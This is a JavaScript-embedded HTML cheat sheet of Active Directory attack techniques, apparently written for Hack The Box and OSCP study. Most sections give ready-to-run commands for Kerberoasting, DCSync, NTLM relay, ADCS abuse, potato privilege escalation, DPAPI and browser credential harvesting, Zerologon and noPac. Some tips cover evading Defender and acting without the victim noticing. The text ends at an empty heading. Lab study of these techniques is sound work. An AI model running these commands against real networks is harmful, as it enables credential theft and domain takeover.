    { title: "Kerberos & Pre-Auth", concepts: [
      { id: "kerberos-overview", title: "Kerberos in 3 minutes", html: `
<h2>The mental model</h2>
<p>Kerberos authenticates users to services without sending passwords over the network. It does this with <b>tickets</b>. You prove you know your password <i>once</i>, at login, by encrypting a timestamp with your password-derived key (<b>pre-authentication</b>). The KDC (= Domain Controller) returns a <b>TGT</b> (Ticket Granting Ticket) encrypted with its own secret — the NT hash of the <code>krbtgt</code> account. The TGT is opaque to you but you don't need to read it; you present it back to the KDC any time you want a <b>TGS</b> (Ticket Granting Service ticket) for a specific service.</p>
<h2>Why it matters for attackers</h2>
<ul>
  <li>If a user has <b>DONT_REQUIRE_PREAUTH</b>, you can ask the KDC for a TGT for them <i>without</i> their password. The returned AS-REP contains a block encrypted with the user's key — crackable offline. (<b>AS-REP Roasting</b>.)</li>
  <li>Any valid domain user can request a TGS for any SPN-bearing account. The TGS is encrypted with the service account's password-derived key — again, crackable offline. (<b>Kerberoasting</b>.)</li>
  <li>If you get <code>krbtgt</code>'s NT hash (via DCSync), you can forge arbitrary TGTs for anyone in the domain — a <b>Golden Ticket</b>.</li>
</ul>
<h2>Clock skew gotcha</h2>
<p>Kerberos uses the timestamp-in-encrypted-envelope to resist replay. If your client clock differs from the KDC by more than 5 minutes, all auth silently fails with <code>KRB_AP_ERR_SKEW</code>. Always <code>sudo ntpdate &lt;DC&gt;</code> before Kerberos operations.</p>` },
      { id: "as-rep-roasting", title: "AS-REP Roasting", html: `
<h2>What is it</h2>
<p>The AS-REQ → AS-REP exchange is the "log in and get a TGT" step. Normally the AS-REQ includes a pre-authentication blob — an encrypted timestamp proving you know the user's password. If the user has <b>DONT_REQUIRE_PREAUTH</b> (<code>userAccountControl</code> bit <code>0x400000</code>), the KDC skips this check and hands back the AS-REP anyway.</p>
<p>The AS-REP includes a structure encrypted with the user's password-derived key. That's the hash you capture — and hashcat mode <b>18200</b> will try password candidates against it offline.</p>
<h2>Finding candidates</h2>
<pre># Without any credentials, brute-force try every user:
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip &lt;DC&gt;

# With creds, query LDAP directly:
ldapsearch ... '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName</pre>
<h2>Cracking</h2>
<pre>hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r best64.rule</pre>
<h2>Defensive nuance</h2>
<p>Pre-auth is disabled on legacy accounts that can't speak modern Kerberos, or intentionally on service accounts using non-Kerberos auth. On HTB this is often the <b>Forest</b> / <b>Sauna</b> pattern and on the OSCP exam it is one of the most reliable early wins.</p>` },
      { id: "kerberoasting", title: "Kerberoasting", html: `
<h2>What is it</h2>
<p>Any authenticated domain user can request a TGS for any account that has a Service Principal Name (SPN). The TGS ticket is encrypted with the target account's long-term key, derived from its password. Request the TGS, carry it home, crack offline.</p>
<h2>Why services are the target</h2>
<p>Services typically run under a <i>user</i> account (not a machine account), and those user passwords are often weak, never rotated, and known to many admins. Machine accounts have 128-char random passwords that you <i>cannot</i> crack — it's the human-service accounts you're after.</p>
<h2>Mechanics</h2>
<pre>impacket-GetUserSPNs DOMAIN/USER:PASS -dc-ip &lt;DC&gt; -request -outputfile spns.hash
hashcat -m 13100 spns.hash /usr/share/wordlists/rockyou.txt -r best64.rule</pre>
<p>Mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4). If RC4 is disabled and only AES-256 is available, use mode 19700.</p>
<h2>Gotchas</h2>
<ul>
  <li>Targeted kerberoast: if you have <b>GenericAll</b> on a user but not their password, you can <code>targetedKerberoast.py</code> — set an SPN, request the TGS, then remove the SPN.</li>
  <li>AES-only accounts still roast (mode 19700) but the cracking is slower.</li>
  <li>krbtgt cannot be roasted (no SPN / auto-rotated).</li>
</ul>` },
    ]},
    { title: "SMB & Authentication", concepts: [
      { id: "smb-auth", title: "SMB Auth, Signing, and NetExec", html: `
<h2>SMB authentication</h2>
<p>SMB2/3 supports NTLM (hash-challenge) and Kerberos (ticket) authentication. HTB-era boxes mostly land on NTLM for both local and domain users; ensure you know which when passing a hash (<code>nxc smb -H &lt;hash&gt;</code> uses LOCAL namespace unless <code>--domain</code> is given).</p>
<h2>Signing</h2>
<p>The <code>nxc smb &lt;target&gt;</code> output column <b>signing</b> tells you whether the server demands signed packets. Signing=False + a coerced NTLM authentication from another principal = NTLM relay on the table.</p>
<h2>Null vs guest</h2>
<p>Null session = anonymous bind with no credentials at all. Guest = anonymous bind that the server maps to the <i>Guest</i> account. Both are rarer on modern Windows but HTB boxes intentionally leave them open.</p>
<h2>Share spidering</h2>
<pre>nxc smb &lt;IP&gt; -u U -p P --spider-plus -M spider_plus -o OUTPUT_FOLDER=loot</pre>
<p>Creds hide in configs far more often than anywhere else: <code>web.config</code>, <code>unattend.xml</code>, <code>hibernate.cfg.xml</code>, <code>Backup.ps1</code>, <code>.kdbx</code>.</p>` },
      { id: "password-spray", title: "Password Sprays Safely", html: `
<h2>Why spray</h2>
<p>Credential reuse is the most reliable AD movement — the same password works for many users, and users reuse across services. A discovered password should be sprayed across all known usernames before you invest in any new foothold vector.</p>
<h2>Lockout policy first</h2>
<pre>nxc smb &lt;IP&gt; -u U -p P --pass-pol</pre>
<p>If the threshold is 3 bad tries in 30 minutes, you can spray once per user every 10 minutes without locking anyone out. If threshold is 0 (no lockout), spray freely.</p>
<h2>Channels to spray</h2>
<p>Spray SMB, LDAP, WinRM, MSSQL, and Kerberos separately — a credential that fails SMB sometimes works against LDAP or WinRM (membership scope varies).</p>
<h2>Spray gotchas</h2>
<ul>
  <li>Don't forget disabled accounts — some HTB boxes track users that are re-enabled via a scheduled task.</li>
  <li>Case sensitivity of usernames only matters for UPN-style Kerberos auth; SMB is case-insensitive.</li>
</ul>` },
    ]},
    { title: "Abuse Paths", concepts: [
      { id: "dcsync", title: "DCSync", html: `
<h2>What is it</h2>
<p>DCSync is the attacker abuse of the <b>DS-Replication-Get-Changes</b> + <b>DS-Replication-Get-Changes-All</b> extended rights. Any principal that holds these rights on the domain object can ask any DC to replicate account data — including NT hashes and Kerberos keys — over MS-DRSR (MS-RPC over SMB/TCP). It is not a bug; it is how DCs sync among themselves. Attackers borrow the API.</p>
<h2>Who has DCSync by default</h2>
<p>Domain Admins, Enterprise Admins, Domain Controllers. On HTB chains, <i>Exchange Windows Permissions</i> (Forest) and misconfigured ACLs frequently grant it to unintended principals.</p>
<h2>Use it</h2>
<pre>impacket-secretsdump DOMAIN/USER:PASS@&lt;DC&gt; -just-dc-ntlm</pre>
<p>Once you have <code>krbtgt</code>'s hash, you can forge a Golden Ticket at will and impersonate anyone across the forest (until krbtgt is rotated twice).</p>` },
      { id: "ntlm-relay", title: "NTLM Relay", html: `
<h2>What is it</h2>
<p>Relay takes an NTLM authentication aimed at one server and forwards it to a second server where you want to act as the victim. The second server sees a valid authentication; the victim sees a normal interaction with the first server. The victim never reveals their password.</p>
<h2>Preconditions</h2>
<ul>
  <li>A way to <i>coerce</i> the victim to authenticate to you: PetitPotam, Printerbug / SpoolSample, MS-EVEN, Coercer (wraps them all).</li>
  <li>A target where SMB signing is <b>not required</b> (or LDAP where binding is permitted). <code>nxc smb &lt;ip&gt;</code>'s <b>signing:False</b> is your shopping list.</li>
</ul>
<h2>Run</h2>
<pre>impacket-ntlmrelayx -tf targets.txt -smb2support -of relayed
# separately: coerce the victim at you
coercer coerce -u U -p P -d DOMAIN -t &lt;victim&gt; -l &lt;your_ip&gt;</pre>
<h2>What you can do once relayed</h2>
<p>Dump SAM on a workstation, drop a file on a share, add a machine to the domain (RBCD), request a certificate (ESC8), or extend to LDAP / HTTP / IMAP sinks.</p>` },
      { id: "pth", title: "Pass-the-Hash & Pass-the-Ticket", html: `
<h2>Pass-the-Hash (PTH)</h2>
<p>NTLM authentication computes a response from the NT hash, not the plaintext. If you have the hash, you don't need the password — for any service that uses NTLM.</p>
<pre>nxc smb     &lt;IP&gt; -u U -H &lt;NT&gt;
evil-winrm  -i &lt;IP&gt; -u U -H &lt;NT&gt;
impacket-wmiexec U@&lt;IP&gt; -hashes :&lt;NT&gt;
xfreerdp /u:U /pth:&lt;NT&gt; /v:&lt;IP&gt;   # only if Restricted Admin enabled</pre>
<h2>Pass-the-Ticket (PTT)</h2>
<p>If you have a Kerberos TGT (usually in a <code>.ccache</code> file on Linux or a Mimikatz <code>kirbi</code> on Windows), export <code>KRB5CCNAME</code> and use Kerberos-aware tools.</p>
<pre>impacket-getTGT DOMAIN/U:PASS && export KRB5CCNAME=$(pwd)/U.ccache
impacket-psexec -k -no-pass DOMAIN/U@&lt;target&gt;</pre>
<h2>When to pick which</h2>
<p>If the service speaks Kerberos natively and is identified by its FQDN (not IP), PTT works cleanly. If it's NTLM-only (legacy HTTP/DBs), PTH. For WinRM: either.</p>` },
      { id: "bloodhound", title: "BloodHound & AD ACLs", html: `
<h2>Why BloodHound</h2>
<p>AD is a graph. Attackers follow edges. BloodHound ingests LDAP + SMB + group data and lets you query "what does principal X ultimately own?" — including transitively via group nesting and ACL chains (GenericAll, GenericWrite, WriteDacl, WriteOwner, ForceChangePassword, AllExtendedRights).</p>
<h2>Collect</h2>
<pre># From Linux (CE-compatible collector):
bloodhound-ce-python -u U -p P -d DOMAIN -dc &lt;DC&gt; -ns &lt;DC&gt; -c all --zip

# From a Windows shell:
Invoke-BloodHound -CollectionMethod All -Domain DOMAIN</pre>
<h2>Queries worth running first</h2>
<ul>
  <li>Shortest Paths from Owned → Domain Admins</li>
  <li>Find Kerberoastable Users</li>
  <li>Find AS-REP Roastable Users</li>
  <li>Find computers with Unconstrained Delegation</li>
  <li>Find users with DCSync rights</li>
</ul>
<h2>The five common edges on HTB</h2>
<ul>
  <li><b>GenericAll / GenericWrite</b> on a user → reset password → log in, or shadow-credentials if PKI available.</li>
  <li><b>ForceChangePassword</b> → <code>net rpc password</code> → new password → log in.</li>
  <li><b>WriteDacl</b> on a group → add yourself → inherit its permissions.</li>
  <li><b>AddMember</b> on a privileged group → add yourself → profit.</li>
  <li><b>GetChanges / GetChanges-All</b> on domain → DCSync.</li>
</ul>` },
      { id: "acl-abuse", title: "ACL Abuse Playbook", html: `
<h2>The abuse tree</h2>
<p>Every AD object has a security descriptor. When your principal has a <i>powerful</i> ACE on a target object, you own its semantics. The common edges, roughly most-to-least destructive:</p>
<table>
<tr><th>Edge</th><th>On target</th><th>Abuse</th></tr>
<tr><td><b>GenericAll</b></td><td>user</td><td>reset pw <i>or</i> shadow-creds <i>or</i> add SPN (targeted roast)</td></tr>
<tr><td><b>GenericAll</b></td><td>computer</td><td>RBCD → impersonate anyone</td></tr>
<tr><td><b>GenericAll</b></td><td>group</td><td>AddMember self</td></tr>
<tr><td><b>GenericWrite</b></td><td>user</td><td>shadow-creds or add SPN</td></tr>
<tr><td><b>WriteDacl</b></td><td>any</td><td>grant yourself GenericAll, then abuse above</td></tr>
<tr><td><b>WriteOwner</b></td><td>any</td><td>take ownership, WriteDacl, GenericAll</td></tr>
<tr><td><b>ForceChangePassword</b></td><td>user</td><td><code>net rpc password</code></td></tr>
<tr><td><b>AllExtendedRights</b></td><td>user</td><td>reset password</td></tr>
<tr><td><b>AllExtendedRights</b></td><td>domain</td><td>DCSync</td></tr>
<tr><td><b>ReadGMSAPassword</b></td><td>gMSA</td><td>retrieve managed password</td></tr>
<tr><td><b>ReadLAPSPassword</b></td><td>computer</td><td>pull LAPS local admin pw</td></tr>
</table>
<h2>Prefer quietest path</h2>
<p>If you have a choice, prefer <b>shadow-credentials</b> over password reset — your victim never notices their password changed. Shadow requires the domain to have ADCS / PKI (for PKINIT), otherwise fall back to password reset.</p>
<h2>Tooling</h2>
<pre># Inventory writable objects first:
bloodyAD -u U -p P -d D --host DC get writable

# Then pick the action:
bloodyAD ... set password &lt;victim&gt; 'NewP@ss123'   # ForceChangePassword
bloodyAD ... add genericAll &lt;dn&gt; &lt;you&gt;            # WriteDacl
certipy shadow auto -u U -p P -account &lt;victim&gt;   # Shadow Creds
targetedKerberoast.py -u U -p P                    # Targeted Kerberoast</pre>` },
      { id: "adcs-esc", title: "ADCS (ESC1–ESC8) Quick Map", html: `
<h2>Why ADCS is a goldmine</h2>
<p>A Certificate Authority in the domain signs certificates for authentication. If template policies are misconfigured, a low-priv user can request a cert <i>as somebody else</i> — including Domain Admin — and then PKINIT as that principal, yielding an NT hash + TGT.</p>
<h2>ESC IDs worth memorising</h2>
<table>
<tr><th>ESC</th><th>Condition</th><th>Abuse</th></tr>
<tr><td><b>ESC1</b></td><td>Template allows <code>ENROLLEE_SUPPLIES_SUBJECT</code> + Client Authentication EKU + Domain Users can enroll</td><td><code>certipy req -template VULN -upn Administrator@...</code></td></tr>
<tr><td><b>ESC2</b></td><td>Any Purpose EKU + enroll</td><td>Same as ESC1</td></tr>
<tr><td><b>ESC3</b></td><td>Enrollment Agent template + enroll</td><td>Two-step: request agent cert, then enrol on behalf of DA</td></tr>
<tr><td><b>ESC4</b></td><td>WriteDacl on a template</td><td>Edit template to become ESC1, then exploit</td></tr>
<tr><td><b>ESC6</b></td><td><code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag on CA</td><td>Supply SAN in any enrollable template</td></tr>
<tr><td><b>ESC7</b></td><td>You have <code>ManageCA</code> or <code>ManageCertificates</code> on CA</td><td>Self-approve a pending cert request</td></tr>
<tr><td><b>ESC8</b></td><td>ADCS web-enroll over HTTP without channel-binding</td><td>NTLM-relay a coerced DC to <code>/certsrv/certfnsh.asp</code></td></tr>
</table>
<h2>Minimum workflow</h2>
<pre># Triage
certipy find -u U@D -p P -dc-ip DC -vulnerable -stdout

# ESC1 exploit:
certipy req -u U@D -p P -dc-ip DC -ca CA_NAME -template VULN -upn Administrator@D -out admin.pfx
certipy auth -pfx admin.pfx -dc-ip DC       # → NT hash + TGT</pre>
<h2>Common gotchas</h2>
<ul>
  <li>Clock skew breaks <code>certipy auth</code> the same way it breaks Kerberos.</li>
  <li>If <code>-upn</code> fails, try <code>-dns</code> with the target machine's FQDN (computer auth).</li>
  <li>ADCS web endpoints live at <code>http://host/certsrv/</code> — if you see 80 + 445 + 88 on the same host, assume ADCS until proven otherwise.</li>
</ul>` },
      { id: "shadow-credentials", title: "Shadow Credentials (Key Credential)", html: `
<h2>What is it</h2>
<p>Windows allows alternative authentication via certificates bound to an AD object through <code>msDS-KeyCredentialLink</code>. The attribute takes a public key; the matching private key lets you PKINIT as that principal. If you have <b>GenericWrite</b> or <b>GenericAll</b> on a user or computer, you can add a Key Credential and authenticate without touching their password.</p>
<h2>Why it beats password reset</h2>
<ul>
  <li>The victim's password doesn't change — logins keep working.</li>
  <li>No audit event "Password was reset" (just "attribute modified", which is rarely alerted on).</li>
  <li>You keep access as long as your cert is valid (default: 30 days).</li>
</ul>
<h2>Requires ADCS / PKINIT in the domain</h2>
<p>The domain must support PKINIT. In practice this means there's an Enterprise CA — which is the same pre-req as ADCS ESC abuse. If <code>certipy find</code> shows any CA, shadow-creds usually works.</p>
<h2>Run</h2>
<pre>certipy shadow auto -u 'attacker@D' -p 'P' -dc-ip DC -account &lt;victim&gt;
# auto mode adds key credential, requests PKINIT cert, authenticates, dumps NT hash,
# then CLEANS UP the key credential on exit.</pre>
<h2>Gotchas</h2>
<ul>
  <li>Computers can be shadowed too — especially useful when you have GenericWrite on a DC's computer object (certipy + upn=HOST$@D yields SYSTEM via S4U2Self).</li>
  <li><code>auto</code> mode cleanup can fail if the process is killed; manually check <code>msDS-KeyCredentialLink</code> with bloodyAD after.</li>
</ul>` },
      { id: "delegation", title: "Delegation: Unconstrained · Constrained · RBCD", html: `
<h2>Three flavours</h2>
<table>
<tr><th>Kind</th><th>Who configures</th><th>Abuse</th></tr>
<tr><td><b>Unconstrained</b></td><td>Domain Admin (rare)</td><td>Any principal auth'ing to the host leaks their TGT. Coerce a DC → dump krbtgt.</td></tr>
<tr><td><b>Constrained (KCD)</b></td><td>Domain Admin</td><td>Computer can S4U2Proxy to specific SPNs as anyone. <code>TrustedToAuthForDelegation</code> = protocol transition = impersonate arbitrary users.</td></tr>
<tr><td><b>RBCD</b></td><td>Target's WriteProperty holder</td><td>Target's <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> names you; you S4U2Self→S4U2Proxy as Administrator onto target.</td></tr>
</table>
<h2>RBCD — the common attacker path</h2>
<p>Requirements: (1) <code>MachineAccountQuota &gt; 0</code> so you can add a machine, (2) <code>WriteProperty</code> (or equivalent) on the target computer object. Both are common on HTB AD sets.</p>
<pre>impacket-addcomputer -computer-name 'attacker$' -computer-pass 'P@ss' \\
  -dc-host DC_FQDN -domain-netbios DOMAIN 'DOMAIN/user:pass'

impacket-rbcd -delegate-from 'attacker$' -delegate-to TARGET$ \\
  -action write 'DOMAIN/user:pass'

impacket-getST -spn cifs/TARGET.DOMAIN -impersonate Administrator \\
  'DOMAIN/attacker$:P@ss'
export KRB5CCNAME=Administrator@cifs_TARGET.DOMAIN@DOMAIN.ccache
impacket-psexec -k -no-pass DOMAIN/Administrator@TARGET.DOMAIN</pre>
<h2>Constrained — when you own a delegated computer</h2>
<pre>impacket-getST -spn cifs/TARGET -impersonate Administrator \\
  -dc-ip DC 'DOMAIN/delegated$:pass'</pre>
<h2>Unconstrained — when you own such a host</h2>
<p>Dump the TGTs from LSA: <code>rubeus monitor /interval:1</code>. Coerce a DC to auth (PetitPotam/Printerbug). You now hold the DC's TGT → DCSync.</p>` },
      { id: "laps-gmsa", title: "LAPS & gMSA — Managed Secrets", html: `
<h2>LAPS</h2>
<p>LAPS stores a per-host local administrator password in AD. Legacy LAPS: <code>ms-mcs-AdmPwd</code>. Windows LAPS (2023+): <code>msLAPS-Password</code>. Only principals explicitly granted <i>Read-Property</i> on the attribute can read it.</p>
<pre># Find who can read LAPS:
nxc ldap &lt;DC&gt; -u U -p P -M laps     # lists readable entries
# Or query directly:
ldapsearch ... -b 'DC=...' '(ms-mcs-AdmPwdExpirationTime=*)' ms-mcs-AdmPwd</pre>
<h2>gMSA</h2>
<p>Group Managed Service Accounts have passwords AD derives on demand. Principals listed in <code>PrincipalsAllowedToRetrieveManagedPassword</code> can compute the current password.</p>
<pre># Pull the managed password:
python3 gMSADumper.py -u U -p P -d D
# Or raw:
bloodyAD -u U -p P -d D --host DC get object gMSA$ --attr msDS-ManagedPassword</pre>
<h2>After retrieval</h2>
<p>gMSA output includes NT hash + AES keys + current clear password. Use PTH or PTT like any other account. gMSA rotation is 30 days — cache the hash somewhere persistent.</p>` },
    ]},
    { title: "Windows Local Privesc", concepts: [
      { id: "potato-family", title: "Potato Family — Token Impersonation", html: `
<h2>When this fires</h2>
<p>If <code>whoami /priv</code> shows <b>SeImpersonatePrivilege</b> or <b>SeAssignPrimaryTokenPrivilege</b> — almost always granted to service accounts (IIS, MSSQL, custom services) — you can coerce a SYSTEM process to authenticate to you over a local named pipe, capture its token, and impersonate it. End state: SYSTEM.</p>
<h2>Which Potato to pick</h2>
<table>
<tr><th>Tool</th><th>Works on</th><th>Mechanism</th></tr>
<tr><td><b>GodPotato</b></td><td>Server 2019/2022, Win10 1809+, Win11</td><td>DCOM RPCSS abuse; modern + reliable</td></tr>
<tr><td><b>PrintSpoofer</b></td><td>Anywhere Spooler runs</td><td>MS-RPRN named pipe coercion; Spooler often disabled on DCs now</td></tr>
<tr><td><b>RoguePotato</b></td><td>Server 2019, Win10 before 1809</td><td>OXID resolver trick</td></tr>
<tr><td><b>JuicyPotato</b></td><td>Server 2016 / Win10 pre-1809</td><td>Original DCOM CLSID abuse</td></tr>
<tr><td><b>DCOMPotato</b></td><td>2022, 2025</td><td>DCOM activation race — newest</td></tr>
</table>
<h2>GodPotato workflow</h2>
<pre>whoami /priv    # confirm SeImpersonate present
GodPotato.exe -cmd "cmd /c whoami &gt; C:\\Windows\\Temp\\gp.txt"
type C:\\Windows\\Temp\\gp.txt   # &quot;nt authority\\system&quot;</pre>
<h2>Common gotchas</h2>
<ul>
  <li>Defender signature-hits GodPotato.exe by name — rename before drop.</li>
  <li>Spooler disabled? PrintSpoofer fails silently; move to GodPotato.</li>
  <li>If SeImpersonate is absent but SeAssignPrimaryToken present, GodPotato works with a slight modification (most builds handle it automatically).</li>
</ul>
<h2>After SYSTEM</h2>
<p>Immediate next steps: dump LSASS (procdump renamed to pd64.exe), extract SAM/SYSTEM/SECURITY hives, run SharpDPAPI for machine-masterkeys. See the DPAPI Harvesting entry.</p>` },
    ]},
    { title: "Recon", concepts: [
      { id: "llmnr-poisoning", title: "LLMNR / NBT-NS / mDNS Poisoning (Responder)", html: `
<h2>What and why</h2>
<p>Windows resolves names via DNS first, then falls back to LLMNR (UDP/5355), NBT-NS (UDP/137), and mDNS (UDP/5353) — all broadcast-based. Clients routinely emit these queries from typos, stale DNS, WPAD auto-discovery, or reconnect churn. Responder runs on the local segment, answers any broadcast, and collects the NetNTLMv2 auth that follows.</p>
<h2>Run</h2>
<pre>sudo responder -I eth0 -wd
# -w  starts the WPAD rogue server (extremely effective on Windows with IE defaults)
# -d  answers NBT-NS Domain Suffix queries
# Logs land in /usr/share/responder/logs</pre>
<h2>What you get</h2>
<p>NetNTLMv2 hashes (hashcat mode <b>5600</b>), sometimes cleartext (FTP/HTTP Basic), browser referrers, WPAD auth. Every NetNTLMv2 is either crackable offline or relayable live.</p>
<h2>Crack vs Relay decision</h2>
<ul>
  <li><b>Crack</b> if the password is likely weak (user accounts, common lab patterns). hashcat -m 5600 rockyou + best64 closes in minutes.</li>
  <li><b>Relay</b> if you can't crack fast enough, or the target user is privileged: <code>impacket-ntlmrelayx -tf smb_signing_false.txt -smb2support -of relayed</code>. Disable Responder's SMB/HTTP listeners first (<code>-rdmzF</code> flags or edit Responder.conf) so the auth hits ntlmrelayx, not Responder.</li>
</ul>
<h2>Common hashes to ignore</h2>
<p>Many labs seed honeypot hashes for names like <b>Administrator</b>, <b>DA-Backup</b>, <b>helpdesk-admin</b>. Cracking these is a trap; always verify the source machine IP resolves to a real host on your scoped subnet, and check the user is referenced elsewhere in your enum.</p>
<h2>Adjacent: mitm6 (IPv6 takeover)</h2>
<p>When LLMNR/NBT are locked down but IPv6 is enabled (it is, by default), <code>mitm6 -d lab.local</code> becomes the local DNS/WPAD server. Combine with ntlmrelayx targeted at LDAPS (<code>-6 -t ldaps://dc</code>) to add a machine account or set RBCD — zero cracking dependency.</p>
<h2>Mitigations in real networks</h2>
<p>GPO-disabled LLMNR + NBT-NS disabled per adapter + mDNS off on workstations + SMB signing required everywhere = Responder dies quiet. In real pentests this works on roughly 60% of networks; on HTB labs, closer to 95%.</p>` },
      { id: "dpapi-harvesting", title: "DPAPI — Offline Credential Harvesting", html: `
<h2>What is DPAPI</h2>
<p>Windows' Data Protection API encrypts per-user and per-machine secrets (browser passwords, Outlook profiles, cached RDP passwords, saved Credential Manager entries, VPN creds) with a masterkey derived from the user's password (user DPAPI) or the machine's boot key (machine DPAPI).</p>
<h2>Why it's gold on a foothold</h2>
<p>Browser and Outlook passwords in DPAPI are frequently tier-up creds — an admin logged into an OWA box, or a service account running Chrome with saved creds to a management portal. Cracking DPAPI is an offline operation; all you need is the right masterkey.</p>
<h2>Triage workflow (SharpDPAPI)</h2>
<pre># On the foothold as admin / SYSTEM:
SharpDPAPI.exe machine triage             # enumerates machine-protected blobs
SharpDPAPI.exe triage /password:'CurrPw'  # user blobs with user's plaintext
SharpDPAPI.exe triage /ntlm:&lt;NT&gt;          # user blobs with NT hash

# Offline from exfiltrated AppData:
SharpDPAPI.exe credentials /mkfile:masterkeys.txt /password:'CurrPw'
SharpDPAPI.exe chrome /mkfile:masterkeys.txt /password:'CurrPw'</pre>
<h2>Key artifacts</h2>
<ul>
  <li><code>%APPDATA%\\Microsoft\\Credentials\\</code> — Credential Manager blobs.</li>
  <li><code>%APPDATA%\\Microsoft\\Protect\\&lt;SID&gt;\\</code> — user masterkeys (encrypted with user password).</li>
  <li><code>%SystemRoot%\\System32\\Microsoft\\Protect\\S-1-5-18\\</code> — machine masterkeys (accessible as SYSTEM only, decrypts with DPAPI_SYSTEM LSA secret).</li>
  <li>Chrome/Edge: <code>%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State</code> (contains encrypted key) + <code>Default\\Login Data</code> (SQLite DB with encrypted passwords).</li>
</ul>
<h2>The chain</h2>
<p>User plaintext / NT hash → decrypt user masterkey → decrypt Credential blob → cleartext password for another service. SYSTEM → dump DPAPI_SYSTEM LSA secret → decrypt machine masterkeys → decrypt machine-protected blobs (service account creds, saved VPN, etc.).</p>
<h2>Gotchas</h2>
<ul>
  <li>DPAPI decryption with NT hash works only for users logged in post-Win10; legacy systems require plaintext.</li>
  <li>If the user's password has recently changed, older blobs were keyed to the old password — Windows migrates masterkeys on next logon but offline blobs stay keyed to whichever hash was active when they were written.</li>
  <li>Microsoft accounts complicate everything; if the user is MSA-signed-in, blobs are tied to a cloud-derived key you won't have.</li>
</ul>` },
      { id: "ad-cves", title: "AD CVE-Class Escalations (noPac · Zerologon · PrintNightmare)", html: `
<h2>When to reach for these</h2>
<p>These are patch-gated — they work only against unpatched / lab-stale DCs. Always run the tester first; exploitation of some (Zerologon especially) leaves the domain in a broken state that breaks replication until remediated.</p>
<table>
<tr><th>CVE</th><th>Name</th><th>Check</th><th>Impact</th></tr>
<tr><td>CVE-2021-42278 / 42287</td><td>noPac (sAMAccountName spoof)</td><td>domain user creds required; tester: noPac.py</td><td>Instant DA via forged PAC</td></tr>
<tr><td>CVE-2020-1472</td><td>Zerologon</td><td>zerologon_tester.py (SAFE)</td><td>Resets DC machine password to null; exploitation allows DCSync; DESTRUCTIVE — restore the DC$ password after</td></tr>
<tr><td>CVE-2021-1675 / 34527</td><td>PrintNightmare</td><td>rpcdump | grep MS-RPRN; spooler reachable</td><td>RCE as SYSTEM on any host with spooler exposed</td></tr>
<tr><td>CVE-2022-26923</td><td>certifried</td><td>certipy find; machine-account template abuse</td><td>Enrol cert as DC via low-priv machine account</td></tr>
</table>
<h2>noPac — the clean one</h2>
<pre>python3 noPac.py lab.local/jdoe:'Pw123'@dc20 -dc-ip 10.10.11.10 \\
  -dc-host dc20.lab.local --impersonate Administrator -shell</pre>
<p>Wraps: (1) add a machine account, (2) clear its sAMAccountName, (3) request a TGT that the KDC encodes for a different principal, (4) S4U2Self → Administrator@DC. Yields Administrator interactive shell in one command.</p>
<h2>Zerologon — the nuclear one</h2>
<p>Always run <code>zerologon_tester.py &lt;dcname&gt; &lt;dcip&gt;</code> first. If vulnerable, the exploit (<code>cve-2020-1472-exploit.py</code>) sets DC$ password to empty → impacket-secretsdump against DC$ with no password → full DCSync. Then you MUST restore the machine password before disconnecting or AD replication breaks for that DC.</p>
<pre>python3 restorepassword.py -hashes :&lt;orig_ntlm&gt; &lt;domain&gt;/&lt;dc&gt;@&lt;dcip&gt;</pre>
<h2>PrintNightmare — the old reliable</h2>
<p>Any host with Spooler reachable and a writable path → remote DLL load as SYSTEM. Version-sensitive; test with <code>CVE-2021-1675.py</code>. On a DC with spooler on, this is a direct escalation without any AD-specific finesse.</p>
<h2>Discipline</h2>
<p>CVE-class exploits are a last resort for a reason: they tell a forensic story, they sometimes break things, and they hide the ACL / cert chain that really let you in. If a quieter path exists (ADCS, BH-driven ACL), take it first and leave the CVE as a report bonus.</p>` },
      { id: "clm-breakout", title: "Constrained Language Mode Breakout", html: `
<h2>What CLM is</h2>
<p>PowerShell Constrained Language Mode (CLM) restricts the language to a safe subset — no .NET reflection, no Add-Type, no COM, no scriptblocks containing certain calls. Common via JEA endpoints, AppLocker policy, and WDAC config.</p>
<h2>Recognizing it</h2>
<pre>PS&gt; $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage</pre>
<h2>Breakout techniques</h2>
<ul>
  <li><b>PSBypassCLM</b> — uses InstallUtil + custom .NET to load a Full-Language runspace.</li>
  <li><b>MSBuild inline task</b> — drop a .csproj that runs <code>System.Reflection</code> code via MSBuild, which isn't blocked.</li>
  <li><b>Custom runspace</b> — Add-Type a full-language runspace from another process via WMI, scheduled task, or runas.</li>
</ul>
<h2>Run</h2>
<pre># PSBypassCLM (compile + InstallUtil trick):
InstallUtil.exe /logfile= /LogToConsole=false /U PSBypassCLM.exe

# MSBuild inline:
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe pwn.csproj</pre>
<h2>Why it matters on HTB</h2>
<p>HTB AD boxes use CLM as a deliberate barrier between WinRM-as-svc and full SYSTEM-style privesc. Common pattern: foothold lands in CLM, then breakout reveals stored creds / DPAPI blobs / loaded LSA secrets.</p>` },
      { id: "dmsa-badsuccessor", title: "dMSA / BadSuccessor (Server 2025)", html: `
<h2>What it is</h2>
<p>Server 2025 introduces <b>delegated Managed Service Accounts (dMSA)</b> — a successor to gMSA. Misconfiguration: any user with <code>CreateChild</code> on an OU + <code>WriteProperty</code> on a dMSA can set its <code>msDS-DelegatedMSAState</code>, making the dMSA a "successor" to a target principal — and the dMSA inherits the target's permissions on next ticket request.</p>
<h2>Why it's powerful</h2>
<p>If the target principal is Domain Admin, the dMSA effectively becomes DA after a Kerberos refresh. No password reset, no shadow-creds — pure ACL→delegation chain. Discovered late 2024, lit in HTB labs starting Eighteen.</p>
<h2>Detect + abuse</h2>
<pre># Tools (newer, may need building from source):
pip install bloodhoundce && bloodyAD
# Identify: any dMSA with msDS-DelegatedMSAState set you can write to.
bloodyAD -u U -p P -d D --host DC get object &lt;dmsa&gt;$ --attr msDS-ManagedAccountPrecededByLink

# Attack:
SharpSuccessor or BadSuccessor.py — set DelegatedMSAState=2 + ManagedPasswordInterval, request TGT.</pre>
<h2>Mitigations</h2>
